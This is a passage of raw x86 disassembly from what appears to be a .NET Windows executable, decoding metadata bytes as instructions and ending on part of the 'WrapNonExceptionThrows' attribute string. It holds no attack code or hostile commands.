  407a3f:	01 01                	add    %eax,(%ecx)
  407a41:	02 05 20 01 01 11    	add    0x11010120,%al
  407a47:	51                   	push   %ecx
  407a48:	0b 07                	or     (%edi),%eax
  407a4a:	09 08                	or     %ecx,(%eax)
  407a4c:	02 02                	add    (%edx),%al
  407a4e:	02 02                	add    (%edx),%al
  407a50:	02 02                	add    (%edx),%al
  407a52:	02 02                	add    (%edx),%al
  407a54:	04 00                	add    $0x0,%al
  407a56:	01 01                	add    %eax,(%ecx)
  407a58:	08 04 00             	or     %al,(%eax,%eax,1)
  407a5b:	01 08                	add    %ecx,(%eax)
  407a5d:	0e                   	push   %cs
  407a5e:	04 00                	add    $0x0,%al
  407a60:	01 02                	add    %eax,(%edx)
  407a62:	0e                   	push   %cs
  407a63:	03 07                	add    (%edi),%eax
  407a65:	01 02                	add    %eax,(%edx)
  407a67:	05 07 02 12 45       	add    $0x45120207,%eax
  407a6c:	02 05 20 00 12 81    	add    0x81120020,%al
  407a72:	11 05 20 00 12 81    	adc    %eax,0x81120020
  407a78:	15 05 00 00 12       	adc    $0x12000005,%eax
  407a7d:	81 19 05 20 01 1d    	sbbl   $0x1d012005,(%ecx)
  407a83:	05 0e 04 00 01       	add    $0x100040e,%eax
  407a88:	0e                   	push   %cs
  407a89:	0e                   	push   %cs
  407a8a:	05 00 01 1d 05       	add    $0x51d0100,%eax
  407a8f:	0e                   	push   %cs
  407a90:	08 20                	or     %ah,(%eax)
  407a92:	03 02                	add    (%edx),%eax
  407a94:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  407a99:	18 07                	sbb    %al,(%edi)
  407a9b:	0e                   	push   %cs
  407a9c:	02 0e                	add    (%esi),%cl
  407a9e:	08 02                	or     %al,(%edx)
  407aa0:	1d 12 65 1d 12       	sbb    $0x121d6512,%eax
  407aa5:	65 08 12             	or     %dl,%gs:(%edx)
  407aa8:	65 02 12             	add    %gs:(%edx),%dl
  407aab:	69 12 6d 0e 1d 0e    	imul   $0xe1d0e6d,(%edx),%edx
  407ab1:	02 0c 20             	add    (%eax,%eiz,1),%cl
  407ab4:	03 01                	add    (%ecx),%eax
  407ab6:	11 81 21 11 81 25    	adc    %eax,0x25811121(%ecx)
  407abc:	11 81 29 05 00 02    	adc    %eax,0x2000529(%ecx)
  407ac2:	02 0e                	add    (%esi),%cl
  407ac4:	0e                   	push   %cs
  407ac5:	06                   	push   %es
  407ac6:	20 01                	and    %al,(%ecx)
  407ac8:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  407acd:	20 01                	and    %al,(%ecx)
  407acf:	08 08                	or     %cl,(%eax)
  407ad1:	06                   	push   %es
  407ad2:	00 01                	add    %al,(%ecx)
  407ad4:	1d 12 65 0e 06       	sbb    $0x60e6512,%eax
  407ad9:	20 02                	and    %al,(%edx)
  407adb:	01 12                	add    %edx,(%edx)
  407add:	65 08 03             	or     %al,%gs:(%ebx)
  407ae0:	20 00                	and    %al,(%eax)
  407ae2:	02 05 20 02 01 0e    	add    0xe010220,%al
  407ae8:	08 05 20 02 01 0e    	or     %al,0xe010220
  407aee:	0e                   	push   %cs
  407aef:	06                   	push   %es
  407af0:	20 01                	and    %al,(%ecx)
  407af2:	01 12                	add    %edx,(%edx)
  407af4:	81 3d 04 20 01 0e 0e 	cmpl   $0x220090e,0xe012004
  407afb:	09 20 02 
  407afe:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  407b03:	81 41 05 20 02 08 08 	addl   $0x8080220,0x5(%ecx)
  407b0a:	08 04 00             	or     %al,(%eax,%eax,1)
  407b0d:	01 01                	add    %eax,(%ecx)
  407b0f:	0e                   	push   %cs
  407b10:	06                   	push   %es
  407b11:	20 02                	and    %al,(%edx)
  407b13:	01 12                	add    %edx,(%edx)
  407b15:	59                   	pop    %ecx
  407b16:	02 05 20 02 01 1c    	add    0x1c010220,%al
  407b1c:	18 0a                	sbb    %cl,(%edx)
  407b1e:	20 03                	and    %al,(%ebx)
  407b20:	01 12                	add    %edx,(%edx)
  407b22:	81 55 02 12 81 51 05 	adcl   $0x5518112,0x2(%ebp)
  407b29:	20 00                	and    %al,(%eax)
  407b2b:	12 81 59 03 20 00    	adc    0x200359(%ecx),%al
  407b31:	0e                   	push   %cs
  407b32:	0b 20                	or     (%eax),%esp
  407b34:	04 01                	add    $0x1,%al
  407b36:	0e                   	push   %cs
  407b37:	12 81 5d 11 81 61    	adc    0x6181115d(%ecx),%al
  407b3d:	02 09                	add    (%ecx),%cl
  407b3f:	20 04 01             	and    %al,(%ecx,%eax,1)
  407b42:	12 81 69 1c 08 08    	adc    0x8081c69(%ecx),%al
  407b48:	0c 20                	or     $0x20,%al
  407b4a:	05 12 7d 1d 05       	add    $0x51d7d12,%eax
  407b4f:	08 08                	or     %cl,(%eax)
  407b51:	12 81 6d 1c 06 00    	adc    0x61c6d(%ecx),%al
  407b57:	01 11                	add    %edx,(%ecx)
  407b59:	81 75 0e 10 07 0c 08 	xorl   $0x80c0710,0xe(%ebp)
  407b60:	02 02                	add    (%edx),%al
  407b62:	02 0a                	add    (%edx),%cl
  407b64:	02 12                	add    (%edx),%dl
  407b66:	80 81 08 02 02 02 02 	addb   $0x2,0x2020208(%ecx)
  407b6d:	05 20 01 08 12       	add    $0x12080120,%eax
  407b72:	7d 06                	jge    0x407b7a
  407b74:	00 02                	add    %al,(%edx)
  407b76:	08 1d 05 08 06 00    	or     %bl,0x60805
  407b7c:	03 0e                	add    (%esi),%ecx
  407b7e:	0e                   	push   %cs
  407b7f:	0e                   	push   %cs
  407b80:	0e                   	push   %cs
  407b81:	07                   	pop    %es
  407b82:	20 03                	and    %al,(%ebx)
  407b84:	08 1d 05 08 08 06    	or     %bl,0x6080805
  407b8a:	20 01                	and    %al,(%ecx)
  407b8c:	01 12                	add    %edx,(%edx)
  407b8e:	81 81 04 20 01 01 1c 	addl   $0x9070f1c,0x1012004(%ecx)
  407b95:	0f 07 09 
  407b98:	1c 02                	sbb    $0x2,%al
  407b9a:	1d 05 02 02 12       	sbb    $0x12020205,%eax
  407b9f:	80 85 08 1d 05 02 06 	addb   $0x6,0x2051d08(%ebp)
  407ba6:	00 02                	add    %al,(%edx)
  407ba8:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  407bab:	02 05 00 01 1d 05    	add    0x51d0100,%al
  407bb1:	08 07                	or     %al,(%edi)
  407bb3:	20 02                	and    %al,(%edx)
  407bb5:	02 08                	add    (%eax),%cl
  407bb7:	11 81 89 07 20 03    	adc    %eax,0x3200789(%ecx)
  407bbd:	01 1d 05 08 08 05    	add    %ebx,0x5080805
  407bc3:	20 01                	and    %al,(%ecx)
  407bc5:	01 1d 05 04 20 01    	add    %ebx,0x1200405
  407bcb:	01 0a                	add    %ecx,(%edx)
  407bcd:	04 00                	add    $0x0,%al
  407bcf:	01 01                	add    %eax,(%ecx)
  407bd1:	1c 06                	sbb    $0x6,%al
  407bd3:	07                   	pop    %es
  407bd4:	02 12                	add    (%edx),%dl
  407bd6:	80 89 0e 06 20 01 12 	orb    $0x12,0x120060e(%ecx)
  407bdd:	80 89 0e 05 20 02 01 	orb    $0x1,0x220050e(%ecx)
  407be4:	03 08                	add    (%eax),%ecx
  407be6:	04 20                	add    $0x20,%al
  407be8:	00 1d 05 03 00 00    	add    %bl,0x305
  407bee:	01 23                	add    %esp,(%ebx)
  407bf0:	07                   	pop    %es
  407bf1:	10 12                	adc    %dl,(%edx)
  407bf3:	80 8d 0e 02 12 80 91 	orb    $0x91,-0x7fedfdf2(%ebp)
  407bfa:	1d 05 0e 1d 12       	sbb    $0x121d0e05,%eax
  407bff:	80 95 08 12 80 95 02 	adcb   $0x2,-0x6a7fedf8(%ebp)
  407c06:	02 12                	add    (%edx),%dl
  407c08:	80 99 12 80 9d 02 12 	sbbb   $0x12,0x29d8012(%ecx)
  407c0f:	80 a1 12 49 05 00 02 	andb   $0x2,0x54912(%ecx)
  407c16:	0e                   	push   %cs
  407c17:	0e                   	push   %cs
  407c18:	0e                   	push   %cs
  407c19:	05 00 00 12 80       	add    $0x80120000,%eax
  407c1e:	95                   	xchg   %eax,%ebp
  407c1f:	05 20 00 12 81       	add    $0x81120020,%eax
  407c24:	95                   	xchg   %eax,%ebp
  407c25:	06                   	push   %es
  407c26:	00 00                	add    %al,(%eax)
  407c28:	1d 12 80 95 05       	sbb    $0x5958012,%eax
  407c2d:	00 01                	add    %al,(%ecx)
  407c2f:	0e                   	push   %cs
  407c30:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  407c35:	01 11                	add    %edx,(%ecx)
  407c37:	81 9d 08 00 01 12 80 	sbbl   $0x80129580,0x12010008(%ebp)
  407c3e:	95 12 80 
  407c41:	99                   	cltd
  407c42:	04 06                	add    $0x6,%al
  407c44:	12 80 9d 09 20 02    	adc    0x220099d(%eax),%al
  407c4a:	12 80 9d 0e 11 81    	adc    -0x7eeef163(%eax),%al
  407c50:	a9 05 20 02 01       	test   $0x1022005,%eax
  407c55:	0e                   	push   %cs
  407c56:	1c 07                	sbb    $0x7,%al
  407c58:	20 02                	and    %al,(%edx)
  407c5a:	01 0e                	add    %ecx,(%esi)
  407c5c:	11 81 b1 03 00 00    	adc    %eax,0x3b1(%ecx)
  407c62:	0e                   	push   %cs
  407c63:	05 07 03 0a 02       	add    $0x20a0307,%eax
  407c68:	02 03                	add    (%ebx),%al
  407c6a:	20 00                	and    %al,(%eax)
  407c6c:	0a 04 07             	or     (%edi,%eax,1),%al
  407c6f:	02 02                	add    (%edx),%al
  407c71:	02 04 20             	add    (%eax,%eiz,1),%al
  407c74:	01 02                	add    %eax,(%edx)
  407c76:	0e                   	push   %cs
  407c77:	11 07                	adc    %eax,(%edi)
  407c79:	07                   	pop    %es
  407c7a:	12 80 a5 12 80 a9    	adc    -0x567fed5b(%eax),%al
  407c80:	12 80 ad 12 80 b1    	adc    -0x4e7fed53(%eax),%al
  407c86:	0e                   	push   %cs
  407c87:	02 02                	add    (%edx),%al
  407c89:	05 20 00 12 80       	add    $0x80120020,%eax
  407c8e:	a9 05 20 00 12       	test   $0x12002005,%eax
  407c93:	80 ad 05 20 00 12 80 	subb   $0x80,0x12002005(%ebp)
  407c9a:	b1 04                	mov    $0x4,%cl
  407c9c:	20 01                	and    %al,(%ecx)
  407c9e:	1c 0e                	sbb    $0xe,%al
  407ca0:	03 20                	add    (%eax),%esp
  407ca2:	00 18                	add    %bl,(%eax)
  407ca4:	05 07 03 02 18       	add    $0x18020307,%eax
  407ca9:	02 03                	add    (%ebx),%al
  407cab:	20 00                	and    %al,(%eax)
  407cad:	08 03                	or     %al,(%ebx)
  407caf:	07                   	pop    %es
  407cb0:	01 0e                	add    %ecx,(%esi)
  407cb2:	03 00                	add    (%eax),%eax
  407cb4:	00 08                	add    %cl,(%eax)
  407cb6:	05 00 00 12 81       	add    $0x81120000,%eax
  407cbb:	c9                   	leave
  407cbc:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  407cc1:	1c 0f                	sbb    $0xf,%al
  407cc3:	07                   	pop    %es
  407cc4:	07                   	pop    %es
  407cc5:	12 80 b5 1d 05 12    	adc    0x12051db5(%eax),%al
  407ccb:	80 b9 1d 05 08 05 0e 	cmpb   $0xe,0x508051d(%ecx)
  407cd2:	06                   	push   %es
  407cd3:	20 01                	and    %al,(%ecx)
  407cd5:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  407cda:	20 01                	and    %al,(%ecx)
  407cdc:	12 80 b9 0e 05 20    	adc    0x20050eb9(%eax),%al
  407ce2:	02 0e                	add    (%esi),%cl
  407ce4:	08 08                	or     %cl,(%eax)
  407ce6:	0b 07                	or     (%edi),%eax
  407ce8:	04 12                	add    $0x12,%al
  407cea:	80 89 02 11 80 bd 1d 	orb    $0x1d,-0x427feefe(%ecx)
  407cf1:	05 05 20 02 0e       	add    $0xe022005,%eax
  407cf6:	0e                   	push   %cs
  407cf7:	0e                   	push   %cs
  407cf8:	03 00                	add    (%eax),%eax
  407cfa:	00 02                	add    %al,(%edx)
  407cfc:	05 20 00 11 80       	add    $0x80110020,%eax
  407d01:	bd 05 00 00 12       	mov    $0x12000005,%ebp
  407d06:	81 d9 06 20 01 01    	sbb    $0x1012006,%ecx
  407d0c:	12 81 d9 06 20 01    	adc    0x12006d9(%ecx),%al
  407d12:	02 11                	add    (%ecx),%dl
  407d14:	81 e1 13 07 06 12    	and    $0x12060713,%ecx
  407d1a:	80 a5 15 12 80 c1 01 	andb   $0x1,-0x3e7fedeb(%ebp)
  407d21:	0e                   	push   %cs
  407d22:	12 80 ad 12 80 b1    	adc    -0x4e7fed53(%eax),%al
  407d28:	02 0e                	add    (%esi),%cl
  407d2a:	06                   	push   %es
  407d2b:	15 12 80 c1 01       	adc    $0x1c18012,%eax
  407d30:	0e                   	push   %cs
  407d31:	05 20 01 01 13       	add    $0x13010120,%eax
  407d36:	00 05 20 00 1d 13    	add    %al,0x131d0020
  407d3c:	00 06                	add    %al,(%esi)
  407d3e:	00 02                	add    %al,(%edx)
  407d40:	0e                   	push   %cs
  407d41:	0e                   	push   %cs
  407d42:	1d 0e 12 07 06       	sbb    $0x607120e,%eax
  407d47:	1d 12 80 c5 1d       	sbb    $0x1dc58012,%eax
  407d4c:	12 80 c5 08 12 80    	adc    -0x7fedf73b(%eax),%al
  407d52:	c5 02                	lds    (%edx),%eax
  407d54:	12 80 c5 06 00 00    	adc    0x6c5(%eax),%al
  407d5a:	1d 12 80 c5 05       	sbb    $0x5c58012,%eax
  407d5f:	20 00                	and    %al,(%eax)
  407d61:	11 81 e5 09 00 02    	adc    %eax,0x20009e5(%ecx)
  407d67:	02 11                	add    (%ecx),%dl
  407d69:	81 e5 11 81 e5 08    	and    $0x8e58111,%ebp
  407d6f:	07                   	pop    %es
  407d70:	04 12                	add    $0x12,%al
  407d72:	80 b9 18 02 0e 02 06 	cmpb   $0x6,0x20e0218(%ecx)
  407d79:	08 07                	or     %al,(%edi)
  407d7b:	20 03                	and    %al,(%ebx)
  407d7d:	01 02                	add    %eax,(%edx)
  407d7f:	0e                   	push   %cs
  407d80:	10 02                	adc    %al,(%edx)
  407d82:	06                   	push   %es
  407d83:	00 01                	add    %al,(%ecx)
  407d85:	01 12                	add    %edx,(%edx)
  407d87:	81 ed 08 07 03 12    	sub    $0x12030708,%ebp
  407d8d:	80 9d 02 12 49 08 20 	sbbb   $0x20,0x8491202(%ebp)
  407d94:	03 01                	add    (%ecx),%eax
  407d96:	0e                   	push   %cs
  407d97:	1c 11                	sbb    $0x11,%al
  407d99:	81 f5 0a 07 04 12    	xor    $0x1204070a,%ebp
  407d9f:	80 9d 1c 1d 05 12 49 	sbbb   $0x49,0x12051d1c(%ebp)
  407da6:	06                   	push   %es
  407da7:	20 01                	and    %al,(%ecx)
  407da9:	12 80 9d 0e 02 1d    	adc    0x1d020e9d(%eax),%al
  407daf:	05 07 20 02 12       	add    $0x12022007,%eax
  407db4:	80 9d 0e 02 1e 07 0b 	sbbb   $0xb,0x71e020e(%ebp)
  407dbb:	12 80 89 0e 0e 12    	adc    0x120e0e89(%eax),%al
  407dc1:	80 89 02 12 80 89 12 	orb    $0x12,-0x767fedfe(%ecx)
  407dc8:	49                   	dec    %ecx
  407dc9:	15 11 80 d9 01       	adc    $0x1d98011,%eax
  407dce:	12 80 89 12 80 89    	adc    -0x767fed77(%eax),%al
  407dd4:	02 12                	add    (%edx),%dl
  407dd6:	49                   	dec    %ecx
  407dd7:	08 15 12 80 c1 01    	or     %dl,0x1c18012
  407ddd:	12 80 89 11 10 01    	adc    0x1101189(%eax),%al
  407de3:	01 15 12 80 c1 01    	add    %edx,0x1c18012
  407de9:	1e                   	push   %ds
  407dea:	00 15 12 81 fd 01    	add    %dl,0x1fd8112
  407df0:	1e                   	push   %ds
  407df1:	00 05 0a 01 12 80    	add    %al,0x8012010a
  407df7:	89 09                	mov    %ecx,(%ecx)
  407df9:	20 00                	and    %al,(%eax)
  407dfb:	15 11 80 d9 01       	adc    $0x1d98011,%eax
  407e00:	13 00                	adc    (%eax),%eax
  407e02:	08 15 11 80 d9 01    	or     %dl,0x1d98011
  407e08:	12 80 89 04 20 00    	adc    0x200489(%eax),%al
  407e0e:	13 00                	adc    (%eax),%eax
  407e10:	05 20 01 02 13       	add    $0x13020120,%eax
  407e15:	00 09                	add    %cl,(%ecx)
  407e17:	07                   	pop    %es
  407e18:	03 12                	add    (%edx),%edx
  407e1a:	80 dd 12             	sbb    $0x12,%ch
  407e1d:	80 e1 1c             	and    $0x1c,%cl
  407e20:	05 00 00 12 82       	add    $0x82120000,%eax
  407e25:	01 06                	add    %eax,(%esi)
  407e27:	00 01                	add    %al,(%ecx)
  407e29:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  407e2e:	20 01                	and    %al,(%ecx)
  407e30:	12 80 dd 1d 05 06    	adc    0x6051ddd(%eax),%al
  407e36:	20 01                	and    %al,(%ecx)
  407e38:	12 80 e1 0e 06 00    	adc    0x60ee1(%eax),%al
  407e3e:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  407e41:	80 e1 08             	and    $0x8,%cl
  407e44:	00 01                	add    %al,(%ecx)
  407e46:	12 80 e1 11 82 0d    	adc    0xd8211e1(%eax),%al
  407e4c:	09 00                	or     %eax,(%eax)
  407e4e:	02 12                	add    (%edx),%dl
  407e50:	82 11 11             	adcb   $0x11,(%ecx)
  407e53:	82 15 0e 1c 00 05 12 	adcb   $0x12,0x5001c0e
  407e5a:	82 1d 11 82 21 0e 15 	sbbb   $0x15,0xe218211
  407e61:	12 81 fd 01 12 80    	adc    -0x7fedfe03(%ecx),%al
  407e67:	e1 12                	loope  0x407e7b
  407e69:	80 e1 15             	and    $0x15,%cl
  407e6c:	12 81 fd 01 12 82    	adc    -0x7dedfe03(%ecx),%al
  407e72:	11 1b                	adc    %ebx,(%ebx)
  407e74:	15 12 80 e5 01       	adc    $0x1e58012,%eax
  407e79:	15 12 80 e9 0a       	adc    $0xae98012,%eax
  407e7e:	12 80 ed 1c 12 59    	adc    0x59121ced(%eax),%al
  407e84:	12 41 0e             	adc    0xe(%ecx),%al
  407e87:	1d 05 12 80 cd       	sbb    $0xcd801205,%eax
  407e8c:	0e                   	push   %cs
  407e8d:	0e                   	push   %cs
  407e8e:	0e                   	push   %cs
  407e8f:	0c 00                	or     $0x0,%al
  407e91:	01 15 12 80 e5 01    	add    %edx,0x1e58012
  407e97:	13 00                	adc    (%eax),%eax
  407e99:	12 82 1d 03 06 13    	adc    0x1306031d(%edx),%al
  407e9f:	00 16                	add    %dl,(%esi)
  407ea1:	15 12 80 e9 0a       	adc    $0xae98012,%eax
  407ea6:	12 80 ed 1c 12 59    	adc    0x59121ced(%eax),%al
  407eac:	12 41 0e             	adc    0xe(%ecx),%al
  407eaf:	1d 05 12 80 cd       	sbb    $0xcd801205,%eax
  407eb4:	0e                   	push   %cs
  407eb5:	0e                   	push   %cs
  407eb6:	0e                   	push   %cs
  407eb7:	17                   	pop    %ss
  407eb8:	20 0a                	and    %cl,(%edx)
  407eba:	01 13                	add    %edx,(%ebx)
  407ebc:	00 13                	add    %dl,(%ebx)
  407ebe:	01 13                	add    %edx,(%ebx)
  407ec0:	02 13                	add    (%ebx),%dl
  407ec2:	03 13                	add    (%ebx),%edx
  407ec4:	04 13                	add    $0x13,%al
  407ec6:	05 13 06 13 07       	add    $0x7130613,%eax
  407ecb:	13 08                	adc    (%eax),%ecx
  407ecd:	13 09                	adc    (%ecx),%ecx
  407ecf:	05 07 01 12 80       	add    $0x80120107,%eax
  407ed4:	89 06                	mov    %eax,(%esi)
  407ed6:	07                   	pop    %es
  407ed7:	02 02                	add    (%edx),%al
  407ed9:	12 80 f1 07 20 03    	adc    0x32007f1(%eax),%al
  407edf:	01 0e                	add    %ecx,(%esi)
  407ee1:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  407ee6:	01 1d 05 08 05 00    	add    %ebx,0x50805
  407eec:	01 0e                	add    %ecx,(%esi)
  407eee:	1d 05 13 07 07       	sbb    $0x7071305,%eax
  407ef3:	02 12                	add    (%edx),%dl
  407ef5:	80 85 12 80 f5 12 80 	addb   $0x80,0x12f58012(%ebp)
  407efc:	f9                   	stc
  407efd:	12 80 fd 1d 05 1d    	adc    0x1d051dfd(%eax),%al
  407f03:	05 06 20 01 01       	add    $0x1012006,%eax
  407f08:	11 82 35 06 20 01    	adc    %eax,0x1200635(%edx)
  407f0e:	01 11                	add    %edx,(%ecx)
  407f10:	82 39 05             	cmpb   $0x5,(%ecx)
  407f13:	20 00                	and    %al,(%eax)
  407f15:	12 82 3d 0c 20 03    	adc    0x3200c3d(%edx),%al
  407f1b:	01 12                	add    %edx,(%edx)
  407f1d:	81 55 12 82 3d 11 82 	adcl   $0x82113d82,0x12(%ebp)
  407f24:	41                   	inc    %ecx
  407f25:	08 20                	or     %ah,(%eax)
  407f27:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  407f2d:	08 05 20 01 0e 1d    	or     %al,0x1d0e0120
  407f33:	05 1c 07 0c 02       	add    $0x20c071c,%eax
  407f38:	12 80 85 12 80 f5    	adc    -0xa7fed7b(%eax),%al
  407f3e:	1d 05 12 80 fd       	sbb    $0xfd801205,%eax
  407f43:	1d 05 1d 05 02       	sbb    $0x2051d05,%eax
  407f48:	12 80 f9 1d 05 1d    	adc    0x1d051df9(%eax),%al
  407f4e:	05 1d 05 0c 00       	add    $0xc051d,%eax
  407f53:	05 01 12 82 4d       	add    $0x4d821201,%eax
  407f58:	08 12                	or     %dl,(%edx)
  407f5a:	82 4d 08 08          	orb    $0x8,0x8(%ebp)
  407f5e:	07                   	pop    %es
  407f5f:	07                   	pop    %es
  407f60:	05 02 08 02 02       	add    $0x2020802,%eax
  407f65:	02 09                	add    (%ecx),%cl
  407f67:	00 02                	add    %al,(%edx)
  407f69:	01 12                	add    %edx,(%edx)
  407f6b:	82 4d 11 82          	orb    $0x82,0x11(%ebp)
  407f6f:	55                   	push   %ebp
  407f70:	0f 07                	sysret
  407f72:	07                   	pop    %es
  407f73:	1d 05 12 80 b9       	sbb    $0xb9801205,%eax
  407f78:	12 81 01 1d 05 08    	adc    0x8051d01(%ecx),%al
  407f7e:	05 0e 07 07 02       	add    $0x207070e,%eax
  407f83:	12 81 01 1d 05 08    	adc    0x8051d01(%ecx),%al
  407f89:	b7 7a                	mov    $0x7a,%bh
  407f8b:	5c                   	pop    %esp
  407f8c:	56                   	push   %esi
  407f8d:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  407f90:	89 08                	mov    %ecx,(%eax)
  407f92:	b0 3f                	mov    $0x3f,%al
  407f94:	5f                   	pop    %edi
  407f95:	7f 11                	jg     0x407fa8
  407f97:	d5 0a                	aad    $0xa
  407f99:	3a 04 20             	cmp    (%eax,%eiz,1),%al
  407f9c:	00 00                	add    %al,(%eax)
  407f9e:	00 04 40             	add    %al,(%eax,%eax,2)
  407fa1:	00 00                	add    %al,(%eax)
  407fa3:	00 04 10             	add    %al,(%eax,%edx,1)
  407fa6:	00 00                	add    %al,(%eax)
  407fa8:	00 04 00             	add    %al,(%eax,%eax,1)
  407fab:	00 00                	add    %al,(%eax)
  407fad:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  407fb1:	00 00                	add    %al,(%eax)
  407fb3:	04 01                	add    $0x1,%al
  407fb5:	00 00                	add    %al,(%eax)
  407fb7:	00 02                	add    %al,(%edx)
  407fb9:	06                   	push   %es
  407fba:	0e                   	push   %cs
  407fbb:	03 06                	add    (%esi),%eax
  407fbd:	12 41 03             	adc    0x3(%ecx),%al
  407fc0:	06                   	push   %es
  407fc1:	12 3c 03             	adc    (%ebx,%eax,1),%bh
  407fc4:	06                   	push   %es
  407fc5:	12 59 03             	adc    0x3(%ecx),%bl
  407fc8:	06                   	push   %es
  407fc9:	12 5d 03             	adc    0x3(%ebp),%bl
  407fcc:	06                   	push   %es
  407fcd:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  407fd2:	03 06                	add    (%esi),%eax
  407fd4:	12 61 02             	adc    0x2(%ecx),%ah
  407fd7:	06                   	push   %es
  407fd8:	02 02                	add    (%edx),%al
  407fda:	06                   	push   %es
  407fdb:	1c 04                	sbb    $0x4,%al
  407fdd:	06                   	push   %es
  407fde:	12 80 cd 09 06 15    	adc    0x150609cd(%eax),%al
  407fe4:	12 80 c1 01 12 80    	adc    -0x7fedfe3f(%eax),%al
  407fea:	89 03                	mov    %eax,(%ebx)
  407fec:	06                   	push   %es
  407fed:	11 50 02             	adc    %edx,0x2(%eax)
  407ff0:	06                   	push   %es
  407ff1:	09 03                	or     %eax,(%ebx)
  407ff3:	06                   	push   %es
  407ff4:	11 48 1c             	adc    %ecx,0x1c(%eax)
  407ff7:	06                   	push   %es
  407ff8:	15 12 80 e5 01       	adc    $0x1e58012,%eax
  407ffd:	15 12 80 e9 0a       	adc    $0xae98012,%eax
  408002:	12 80 ed 1c 12 59    	adc    0x59121ced(%eax),%al
  408008:	12 41 0e             	adc    0xe(%ecx),%al
  40800b:	1d 05 12 80 cd       	sbb    $0xcd801205,%eax
  408010:	0e                   	push   %cs
  408011:	0e                   	push   %cs
  408012:	0e                   	push   %cs
  408013:	04 00                	add    $0x0,%al
  408015:	00 12                	add    %dl,(%edx)
  408017:	59                   	pop    %ecx
  408018:	05 00 01 01 12       	add    $0x12010100,%eax
  40801d:	59                   	pop    %ecx
  40801e:	04 00                	add    $0x0,%al
  408020:	00 12                	add    %dl,(%edx)
  408022:	5d                   	pop    %ebp
  408023:	05 00 01 01 12       	add    $0x12010100,%eax
  408028:	5d                   	pop    %ebp
  408029:	04 00                	add    $0x0,%al
  40802b:	00 1d 05 05 00 01    	add    %bl,0x1000505
  408031:	01 1d 05 03 00 00    	add    %ebx,0x305
  408037:	0a 04 00             	or     (%eax,%eax,1),%al
  40803a:	01 01                	add    %eax,(%ecx)
  40803c:	0a 04 00             	or     (%eax,%eax,1),%al
  40803f:	00 12                	add    %dl,(%edx)
  408041:	61                   	popa
  408042:	05 00 01 01 12       	add    $0x12010100,%eax
  408047:	61                   	popa
  408048:	04 00                	add    $0x0,%al
  40804a:	01 01                	add    %eax,(%ecx)
  40804c:	02 03                	add    (%ebx),%al
  40804e:	00 00                	add    %al,(%eax)
  408050:	1c 0a                	sbb    $0xa,%al
  408052:	00 04 02             	add    %al,(%edx,%eax,1)
  408055:	1c 12                	sbb    $0x12,%al
  408057:	71 12                	jno    0x40806b
  408059:	75 11                	jne    0x40806c
  40805b:	79 05                	jns    0x408062
  40805d:	00 01                	add    %al,(%ecx)
  40805f:	01 12                	add    %edx,(%edx)
  408061:	7d 08                	jge    0x40806b
  408063:	00 01                	add    %al,(%ecx)
  408065:	12 80 c5 12 80 c9    	adc    -0x367fed3b(%eax),%al
  40806b:	03 00                	add    (%eax),%eax
  40806d:	00 18                	add    %bl,(%eax)
  40806f:	08 00                	or     %al,(%eax)
  408071:	03 08                	add    (%eax),%ecx
  408073:	18 12                	sbb    %dl,(%edx)
  408075:	80 b9 08 04 00 01 18 	cmpb   $0x18,0x1000408(%ecx)
  40807c:	0e                   	push   %cs
  40807d:	06                   	push   %es
  40807e:	00 02                	add    %al,(%edx)
  408080:	02 18                	add    (%eax),%bl
  408082:	10 02                	adc    %al,(%edx)
  408084:	06                   	push   %es
  408085:	00 01                	add    %al,(%ecx)
  408087:	11 48 11             	adc    %ecx,0x11(%eax)
  40808a:	48                   	dec    %eax
  40808b:	06                   	push   %es
  40808c:	00 03                	add    %al,(%ebx)
  40808e:	01 09                	add    %ecx,(%ecx)
  408090:	09 09                	or     %ecx,(%ecx)
  408092:	07                   	pop    %es
  408093:	00 02                	add    %al,(%edx)
  408095:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  408098:	80 d5 06             	adc    $0x6,%ch
  40809b:	00 02                	add    %al,(%edx)
  40809d:	02 0e                	add    (%esi),%cl
  40809f:	1d 05 06 00 01       	sbb    $0x1000605,%eax
  4080a4:	01 12                	add    %edx,(%edx)
  4080a6:	80 89 07 20 02 02 1d 	orb    $0x1d,0x2022007(%ecx)
  4080ad:	05 1d 05 04 08       	add    $0x804051d,%eax
  4080b2:	00 12                	add    %dl,(%edx)
  4080b4:	59                   	pop    %ecx
  4080b5:	04 08                	add    $0x8,%al
  4080b7:	00 12                	add    %dl,(%edx)
  4080b9:	5d                   	pop    %ebp
  4080ba:	04 08                	add    $0x8,%al
  4080bc:	00 1d 05 03 08 00    	add    %bl,0x80305
  4080c2:	0a 04 08             	or     (%eax,%ecx,1),%al
  4080c5:	00 12                	add    %dl,(%edx)
  4080c7:	61                   	popa
  4080c8:	03 08                	add    (%eax),%ecx
  4080ca:	00 02                	add    %al,(%edx)
  4080cc:	03 08                	add    (%eax),%ecx
  4080ce:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  4080d1:	08 00                	or     %al,(%eax)
  4080d3:	08 08                	or     %cl,(%eax)
  4080d5:	01 00                	add    %eax,(%eax)
  4080d7:	08 00                	or     %al,(%eax)
  4080d9:	00 00                	add    %al,(%eax)
  4080db:	00 00                	add    %al,(%eax)
  4080dd:	1e                   	push   %ds
  4080de:	01 00                	add    %eax,(%eax)
  4080e0:	01 00                	add    %eax,(%eax)
  4080e2:	54                   	push   %esp
  4080e3:	02 16                	add    (%esi),%dl
  4080e5:	57                   	push   %edi
  4080e6:	72 61                	jb     0x408149
  4080e8:	70 4e                	jo     0x408138
  4080ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4080eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4080ec:	45                   	inc    %ebp
  4080ed:	78 63                	js     0x408152
  4080ef:	65 70 74             	gs jo  0x408166
